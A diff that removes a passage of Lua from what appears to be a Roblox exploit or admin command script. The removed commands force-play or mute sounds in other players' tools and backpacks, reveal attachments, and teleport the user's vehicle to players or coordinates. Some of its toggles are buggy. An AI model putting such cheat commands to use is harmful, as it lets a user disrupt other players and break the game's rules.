-function useCommand.unsupermute()
-	opx("-","UnSuper muted game")
-	mutealls = false
-end
-
-local forceplayConns = {}
-local allForcePlayConn = nil
-local forcePlayLoop = nil
-
-function ForcePlayFind(v, tablex, once)
-	if once then
-		local onceAudios = {}
-		for x,y in pairs(v.Character:GetChildren()) do
-			if y:IsA("Tool") then
-				for c,m in pairs(y:GetDescendants()) do
-					if m:IsA("Sound") then
-						m.Playing = true
-					end
-				end
-			end
-		end
-		for x,y in pairs(v.Backpack:GetDescendants()) do
-			if y:IsA("Sound") then
-				y.Playing = true
-			end
-		end
-		return
-	end
-	pcall(function()
-		for x,y in pairs(v.Character:GetChildren()) do
-			if y:IsA("Tool") then
-				for c,m in pairs(y:GetDescendants()) do
-					if m:IsA("Sound") then
-						m.Playing = true
-					end
-				end
-			end
-		end
-		for x,y in pairs(v.Backpack:GetDescendants()) do
-			if y:IsA("Sound") then
-				y.Playing = true
-			end
-		end
-	end)
-end
-
-function ForcePlayLoop()
-   	forcePlayLoop = game:GetService("RunService").RenderStepped:Connect(function()
-        for i,v in pairs(forceplayConns) do
-            ForcePlayFind(v[1], v)
-        end
-    end)
-end
-
-function useCommand.backpackplay()
-	if allForcePlayConn then
-		forceplayConns = {}
-		allForcePlayConn:Disconnect()
-		allForcePlayConn = nil
-		forcePlayLoop:Disconnect()
-		forcePlayLoop = nil
-		opx("-","Backpack play all is no longer enabled")
-		return
-	end
-	if not arguments[2] or arguments[2] == "all" then
-		opx("-","Backpack play all is now enabled")
-		forceplayConns = {}
-		for i,v in pairs(cmdp:GetPlayers()) do
-			table.insert(forceplayConns, {v, x = {}})
-		end
-		allForcePlayConn = cmdp.PlayerAdded:Connect(function(v)
-			table.insert(forceplayConns, {v, x = {}})
-		end)
-		if not forcePlayLoop then
-			ForcePlayLoop()
-		end
-	elseif arguments[2] and arguments[2] ~= "all" then
-		local target = findplr(arguments[2])
-		if not target then
-			opx("*","Player does not exist!")
-			return
-		end
-		local targetWasIn = false
-		for i,v in pairs(forceplayConns) do
-			if target == v[1] then
-				targetWasIn = true
-				table.remove(forceplayConns, i)
-			end
-		end
-		if targetWasIn then
-			if #forceplayConns == 0 then
-				forcePlayLoop:Disconnect()
-				forcePlayLoop = nil
-			end
-			opx("-","Backpack play "..target.Name.." is no longer enabled")
-			return
-		end
-		opx("-","Backpack play "..target.Name.." is now enabled")
-		table.insert(forceplayConns, {target, x = {}})
-		if not forcePlayLoop then
-			ForcePlayLoop()
-		end
-	end
-end
-
-function useCommand.unforceplay()
-	if not arguments[2] or arguments[2] == "all" then
-		forceplayConns = {}
-		pcall(function() allForcePlayConn:Disconnect()
-		allForcePlayConn = nil  end)
-		pcall(function() forcePlayLoop:Disconnect()
-		forcePlayLoop = nil end)
-		opx("-","Force play all is no longer enabled")
-	elseif arguments[2] and arguments[2] ~= "all" then
-		local target = findplr(arguments[2])
-		if not target then
-			opx("*","Player does not exist!")
-			return
-		end
-		local targetWasIn = false
-		for i,v in pairs(forceplayConns) do
-			if target == v[1] then
-				targetWasIn = true
-				table.remove(forceplayConns, i)
-			end
-		end
-		if targetWasIn then
-			if #forceplayConns == 0 then
-				forcePlayLoop:Disconnect()
-				forcePlayLoop = nil
-			end
-			opx("-","Force play "..target.Name.." is no longer enabled")
-			return
-		else
-			opx("*","Force play "..target.Name.." was not enabled")
-		end
-	end
-end
-
-local allMuteConn = nil
-local muteConns = {}
-local muteLoop = nil
-
-function MuteFind(v, tablex, once)
-	if once then
-		local onceAudios = {}
-		for x,y in pairs(v.Character:GetChildren()) do
-			if y:IsA("Tool") then
-				for c,m in pairs(y:GetDescendants()) do
-					if m:IsA("Sound") then
-						m.Playing = false
-					end
-				end
-			end
-		end
-		for x,y in pairs(v.Backpack:GetDescendants()) do
-			if y:IsA("Sound") then
-				y.Playing = false
-			end
-		end
-		return
-	end
-	pcall(function()
-		for x,y in pairs(v.Character:GetChildren()) do
-			if y:IsA("Tool") then
-				for c,m in pairs(y:GetDescendants()) do
-					if m:IsA("Sound") then
-						m.Playing = false
-					end
-				end
-			end
-		end
-		for x,y in pairs(v.Backpack:GetDescendants()) do
-			if y:IsA("Sound") then
-				y.Playing = false
-			end
-		end
-	end)
-end
-
-function MuteLoop()
-   	muteLoop = game:GetService("RunService").RenderStepped:Connect(function()
-        for i,v in pairs(muteConns) do
-            MuteFind(v[1], v)
-        end
-    end)
-end
-
-function useCommand.mute()
-	if allMuteConn then
-		muteConns = {}
-		allMuteConn:Disconnect()
-		allMuteConn = nil
-		muteLoop:Disconnect()
-		muteLoop = nil
-		opx("-","Mute all is no longer enabled")
-		return
-	end
-    if not arguments[2] or arguments[2] == "all" then
-		opx("-","Mute all is now enabled")
-		muteConns = {}
-		for i,v in pairs(cmdp:GetPlayers()) do
-			table.insert(muteConns, {v, x = {}})
-		end
-		allMuteConn = cmdp.PlayerAdded:Connect(function(v)
-			table.insert(muteConns, {v, x = {}})
-		end)
-		if not muteLoop then
-			MuteLoop()
-		end
-	elseif arguments[2] and arguments[2] ~= "all" then
-		local target = findplr(arguments[2])
-		if not target then
-			opx("*","Player does not exist!")
-			return
-		end
-		local targetWasIn = false
-		for i,v in pairs(muteConns) do
-			if target == v[1] then
-				targetWasIn = true
-				table.remove(muteConns, i)
-			end
-		end
-		if targetWasIn then
-			if #muteConns == 0 then
-				muteLoop:Disconnect()
-				muteLoop = nil
-			end
-			opx("-","Mute "..target.Name.." is no longer enabled")
-			return
-		end
-		opx("-","Mute "..target.Name.." is now enabled")
-		table.insert(muteConns, {target, x = {}})
-		if not muteLoop then
-			MuteLoop()
-		end
-	end
-end
-
-function useCommand.unmute()
-	if not arguments[2] or arguments[2] == "all" then
-		muteConns = {}
-		pcall(function() allMuteConn:Disconnect()
-		allMuteConn = nil  end)
-		pcall(function() muteLoop:Disconnect()
-		muteLoop = nil end)
-		opx("-","Mute all is no longer enabled")
-	elseif arguments[2] and arguments[2] ~= "all" then
-		local target = findplr(arguments[2])
-		if not target then
-			opx("*","Player does not exist!")
-			return
-		end
-		local targetWasIn = false
-		for i,v in pairs(muteConns) do
-			if target == v[1] then
-				targetWasIn = true
-				table.remove(muteConns, i)
-			end
-		end
-		if targetWasIn then
-			if #muteConns == 0 then
-				muteLoop:Disconnect()
-				muteLoop = nil
-			end
-			opx("-","Mute "..target.Name.." is no longer enabled")
-			return
-		else
-			opx("*","Mute "..target.Name.." was not enabled")
-		end
-	end
-end
-
-cmdp.PlayerRemoving:Connect(function(targ)
-	for i,v in pairs(muteConns) do
-		if v[1] == targ then
-			table.remove(muteConns, i)
-		end
-	end
-	for i,v in pairs(forceplayConns) do
-		if v[1] == targ then
-			table.remove(forceplayConns, i)
-		end
-	end
-end)
-
-function useCommand.cutmuteloop()
-	muteall = false
-	opx("-","Stopped mute loop")
-end
-
-xAtt = {}
-function useCommand.attachmenttruesight()
-	opx("-","Attachment truesight is now active")
-	for i,v in pairs(workspace:GetDescendants()) do
-		if v:IsA("Attachment") then
-			v.Visible = true
-			table.insert(xAtt, v)
-		end
-	end
-end
-
-function useCommand.unattachmenttruesight()
-	opx("-","Attachment truesight is no longer active")
-	for i,v in pairs(xAtt) do
-		v.Visible = true
-	end
-	xAtt = {}
-end
-
-function useCommand.vgoto()
-	if arguments[2] then
-		target = findplr(arguments[2])
-		if target then
-			opx("-","Now vehicle teleporting to "..target.Name)
-			local Car = cmdlp.Character.Humanoid.SeatPart
-			Car.Parent.Parent:MoveTo(target.Character.HumanoidRootPart.Position)
-		else
-			opx("*","Player does not exist!")
-		end
-	else
-		opx("*","2 arguments are needed for this command!")
-	end
-end
-
-function useCommand.vfreegoto()
-	if arguments[4] then
-		opx("-","Now vehicle teleporting to pos")
-		local Car = cmdlp.Character.Humanoid.SeatPart
-		Car.Parent.Parent:MoveTo(arguments[2], arguments[3], arguments[4])
-	else
-		opx("*","4 arguments are needed for this command!")
-	end
-end
-
-function useCommand.vloadpos()
-	if arguments[2] then
-		wpNS = getstring(2)
-		fo
